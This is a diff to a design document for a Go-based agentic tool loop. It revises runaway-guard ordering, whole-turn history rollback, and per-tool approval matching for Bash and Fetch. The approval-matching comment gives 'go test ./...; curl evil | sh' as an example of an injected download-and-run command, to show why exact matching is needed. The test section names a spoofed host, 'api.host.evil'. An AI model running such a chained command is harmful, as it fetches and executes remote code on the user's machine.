@@ -87,6 +87,15 @@ Date: 2026-06-14 · Status: approved (brainstorm)
 > reject symlinked policy-path components, reject group/world-writable files (§3c);
 > (5) clarified `Cache[T any]` is the permitted type-parameter idiom (not banned
 > `any`) and is required by the layering; concrete alternative noted (§3d).
+>
+> **Revision 2026-06-14 (review pass 8)** resolves a seventh-pass follow-up:
+> (1) the runaway guard no longer leaves malformed history — the cap is checked
+> *before* appending the assistant-with-tool-calls message, and **rollback is
+> generalized to the whole turn** (snapshot `base`; any `TurnFailed`/`TurnInterrupted`
+> truncates `msgs[:base]`), so no unpaired `tool_use` can persist; the wrong
+> "stays in history" claim is removed (§2a); (2) stale match descriptions in
+> `ToolPolicy`, the `ApprovalRecord` comment, and the test section updated to exact-Bash
+> + the Fetch `METHOD scheme://host` grammar (§3b, §3c, §5e).
 
 ## Scope
 
@@ -183,6 +192,7 @@ becomes the agentic loop, re-streaming after each tool batch until the model sto
 calling tools:
 
 ```
+base := len(msgs)                       // pre-turn snapshot for whole-turn rollback
 append user message to msgs; emit TurnStarted
 iters, calls := 0, 0
 for {
@@ -190,24 +200,37 @@ for {
     stream := client.Stream(ctx, req)
     // accumulate: TextChunk/ThinkingChunk → emit TokenDelta (unchanged)
     //             ToolUseChunk           → fold by Index into []ToolUseBlock (validate, §2b)
+    if iters+1 > MaxToolIterations || calls+len(toolUseBlocks) > MaxToolCallsPerTurn {
+        msgs = msgs[:base]; emit TurnFailed(&ToolLimitError{…}); return   // roll back BEFORE appending
+    }
     assemble AIMessage{Blocks: [thinking…, text, toolUse…]}; append to msgs
     if no tool_use blocks { emit TurnDone(msg); return }
     iters++; calls += len(toolUseBlocks)
-    if iters > MaxToolIterations || calls > MaxToolCallsPerTurn {
-        emit TurnFailed(&ToolLimitError{Iterations: iters, Calls: calls}); return   // controlled stop
-    }
     results := runner.RunBatch(ctx, toolUseBlocks, cfg.Tools, gateReg, emit)
     for each result: append content.ToolMessage{ToolUseID, Blocks: flattenToText(result.Content)} to msgs
     if any result.Terminate { emit TurnDone(lastAIMessage); return }
 }
+// on ctx-cancel / interrupt anywhere above: msgs = msgs[:base]; emit TurnInterrupted; return
 ```
 
 **Runaway guard.** `MaxToolIterations` (LLM↔tool round-trips) and
 `MaxToolCallsPerTurn` (total executions) bound the loop so a stuck model can't run
-auto-approved tools forever. Exceeding either ends the turn with a controlled
-`event.TurnFailed{Err: &ToolLimitError{…}}` (a typed loop error) — the assistant/tool
-exchange so far stays in history (it completed cleanly); the turn just stops looping.
-Defaults (25 / 100) are applied by `loop.New` when the `ToolSet` fields are zero.
+auto-approved tools forever. The cap is checked **before** the offending
+assistant-with-tool-calls message is appended, and on `ToolLimitError` the **whole
+turn is rolled back** to `base` — so history can never contain a `tool_use` block
+without its matching `ToolMessage` (an unpaired call would make the next provider
+request unencodable). Defaults (25 / 100) applied by `loop.New` when the `ToolSet`
+fields are zero.
+
+**Generalized rollback contract.** The single-stream `runTurn` rolled back just the
+user message (`msgs[:len(msgs)-1]`). The agentic loop appends many messages per turn,
+so rollback is generalized: snapshot `base := len(msgs)` at turn start; **any** abnormal
+exit — `TurnFailed` (including `ToolLimitError`) or `TurnInterrupted` — truncates
+`msgs = msgs[:base]`, discarding the *entire* turn's exchange. Only a `TurnDone` path
+keeps the turn in history (and only well-formed, paired exchanges reach a `TurnDone`).
+The TUI keeps its own display transcript (TUI design), so the human still *sees* the
+interrupted/failed exchange even though the model's context drops it — the existing
+`TurnFailed`/`TurnInterrupted` behavior, now applied to the multi-message turn.
 
 - `toolDefs` maps each registered tool's `Info(ctx)` → `llm.Tool{Name,
   Description, Schema}`. `ToolInfo.Schema` is `json.RawMessage` (1:1 with
@@ -231,15 +254,15 @@ Defaults (25 / 100) are applied by `loop.New` when the `ToolSet` fields are zero
   the wire (`encode.go:165`), so provider replay of thinking is *not* something to
   rely on with today's providers (lmstudio/phala/chutes). "Preserved" here means
   internal history, not wire replay.
-- The existing **history-rollback** contract is unchanged for failures; a
-  *completed* tool-using turn advances history with the full assistant↔tool
-  exchange.
+- **History-rollback is generalized** to the whole turn (snapshot `base` above): any
+  abnormal exit truncates `msgs[:base]`; only a `TurnDone` path keeps the (well-formed,
+  fully paired) exchange. See the *Generalized rollback contract* note above.
 - **Turn completion vs. abort.** The agentic loop completes *normally* (emits
   `TurnDone`) on either of two paths: the model returns no tool calls, or a tool
-  result sets `Terminate`. The only things that *abort* a turn — no `TurnDone`,
-  `TurnInterrupted` instead — are `ctx` cancellation and `Interrupt`. (See §2d;
-  "tool failures never terminate" means a tool *error* never aborts, not that
-  `Terminate` can't complete.)
+  result sets `Terminate`. The things that *abort* a turn — no `TurnDone`, whole-turn
+  rollback — are `ctx` cancellation / `Interrupt` (`TurnInterrupted`) and the runaway
+  guard (`TurnFailed{ToolLimitError}`). (See §2d; "tool failures never terminate"
+  means a tool *error* never aborts, not that `Terminate` can't complete.)
 
 ### §2b. Streaming tool calls — `content.ToolUseChunk`
 
@@ -544,7 +567,7 @@ type Effect uint8 // EffectAutoApprove | EffectAsk | EffectDeny
 type ToolPolicy struct {
     Tool   string
     Effect Effect
-    Match  []string // tool-interpreted patterns (path glob / cmd prefix / URL-host prefix); empty = all
+    Match  []string // tool-interpreted (path glob / EXACT Bash command / "METHOD scheme://host"); empty = all
 }
 
 type PermissionGate interface {
@@ -720,7 +743,8 @@ type ApprovalRecord struct {
     Effect Effect `json:"effect"`
 }
 // Match is interpreted by the tool's matcher: a path glob (ReadFile/WriteFile/
-// EditFile/Glob/Grep), the command string (Bash), or a host (Fetch).
+// EditFile/Glob/Grep), the EXACT normalized command (Bash), or the
+// "METHOD scheme://host[path-prefix]" grammar (Fetch, §3c). WebSearch ignores Match.
 // **Bash matching is EXACT (normalized) by default** — a Grant from the prompt writes
 // the exact normalized command, so a grant of "go test ./..." does NOT also approve
 // "go test ./...; curl evil | sh". A prefix rule requires the hand-edited
@@ -981,8 +1005,9 @@ The pixel-level work is a follow-up TUI-update doc, since that TUI is mid-flight
   rules; `Bash` exit/timeout/truncation; `Fetch` method + truncation; `WebSearch`
   via a fake `SearchProvider`; `AskUser` answer validation. **`Glob`/`Grep` exclude
   a `DeniedReadPaths` entry** (e.g. a `.env` in the workspace) from results/matches.
-- approval matching — generalized `Match` interpreted per tool: path glob (files),
-  command prefix (`Bash`), URL/host prefix (`Fetch`), ignored (`WebSearch`).
+- approval matching — `Match` interpreted per tool: path glob (files), **exact
+  normalized command** (`Bash`; `"prefix": true` opt-in), **`METHOD scheme://host`**
+  (`Fetch`), ignored (`WebSearch`).
 - observability — `ToolCallStarted.Summary` is the **redacted** form: `WriteFile`
   carries no content, `Fetch` no headers/body (assert no secret substring leaks).
 - least-privilege deps — a web tool's constructor takes no workspace root (compile-
@@ -1038,7 +1063,10 @@ The pixel-level work is a follow-up TUI-update doc, since that TUI is mid-flight
   tool-result error for that call; history re-encodes cleanly on the next request.
 - runaway guard — a model that emits a tool call every round hits
   `MaxToolIterations`/`MaxToolCallsPerTurn` and ends in `TurnFailed{ToolLimitError}`
-  (not an infinite loop); the prior exchange remains in history.
+  (not an infinite loop); **the whole turn is rolled back to `base`** so `msgs` holds
+  no unpaired `tool_use` block (assert the next encode succeeds).
+- whole-turn rollback — `TurnFailed`/`TurnInterrupted` mid-agentic-loop truncates all
+  of the turn's appended messages (user + every assistant/tool pair), not just the last.
 - Fetch match — a `GET https://api.host` grant does **not** approve a `POST` to the
   same host, an `http://` request, or `api.host.evil`.
 - policy-store hardening — `Grant` creates dirs `0700`/files `0600`, refuses to follow
